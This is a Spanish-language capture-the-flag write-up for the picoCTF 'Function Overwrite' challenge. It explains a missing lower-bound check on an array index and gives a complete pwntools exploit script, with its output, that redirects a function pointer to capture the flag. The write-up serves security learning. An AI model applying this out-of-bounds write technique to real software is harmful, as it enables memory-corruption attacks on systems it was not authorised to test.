# Function Overwrite

En este ejercicio nos dan un binario y su código fuente.

```c
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

El ejercicio nos pide una historia y después pide 2 números:

```c
./vuln                         
Tell me a story and then I'll tell you if you're a 1337 >> blablabla
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
5
6
You've failed this class.   
```

Vamos a ver un poco el código:

```c
void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

Si nos fijamos en esa función podemos ver que:

* Nuestra historia se guarda en la variable `story`
* Nuestros números se guardan en `num1` y `num2`
* Hay un chequeo que comprueba si `num1` es menor a 10 y, si es así, suma el elemento `num1` del array `fun` al valor de `num2`
* Se llama a la función `check`

Como podemos ver el programa nos da el poder de controlar un índice, y peor aún, nos deja cambiar el contenido de ese elemento. Para rematar esto, aunque haya un chequeo de máximo, no hay un chequeo mínimo, lo que nos permite introducir un numero negativos.

Que pasa si hacemos por ejemplo un `fun[-4] += 10`? Le sumaremos `10` al valor que esté en la dirección de `fun - 16 bytes`.

Entonces, **como `check` es un puntero a función guardado en memoria**, y el código realiza una operación de suma con `+=`, podemos **sumar un valor a la dirección actual de `check`** para redirigir el flujo de ejecución.

```c
void (*check)(char*, size_t) = hard_checker;
```

En lugar de escribir directamente la dirección de la función `easy_checker`, **calculamos la diferencia entre `easy_checker` y `hard_checker`**, y sumamos ese valor a `check`. De este modo, `check` termina apuntando a `easy_checker`.

Luego, cuando se llama a `check(story, strlen(story))`, se ejecuta `easy_checker`, que nos da la flag si el contenido de `story` suma 1337 en hexadecimal (es decir, la suma de los valores ASCII de los caracteres que contiene).

```c
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
```

Vamos a hacer el script:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("saturn.picoctf.net", 53697)

def main():
    io = conn()

    story = "A" * 19 + "15"
    info(f'Suma Story: {sum(ord(c) for c in story)}')
    
    num1 = (exe.symbols["fun"] - exe.symbols["check"]) // 4
    info(f'Num1: {num1}')
    
    num2 = exe.symbols.easy_checker - exe.symbols.hard_checker
    info(f'Num2: {hex(num2)}')
    
    io.sendlineafter(b'>> ', story)
    io.sendlineafter(b'.', f'{num1}'.encode())
    io.recvline()
    io.sendline(str(num2))
    io.interactive()

if __name__ == "__main__":
    main()

```

Vamos a probarlo:

```c
[+] Opening connection to saturn.picoctf.net on port 61719: Done
[*] Suma Story: 1337
[*] Num1: -16
[*] Num2: -0x13a
/home/ub1cu0/Desktop/picoCTF/function_overwrite/solve.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter(b'>> ', story)
/home/ub1cu0/Desktop/picoCTF/function_overwrite/solve.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(str(num2))
[*] Switching to interactive mode
You're 1337. Here's the flag.
picoCTF{SECRETO}
[*] Got EOF while reading in interactive
```

Tenemos la flag!
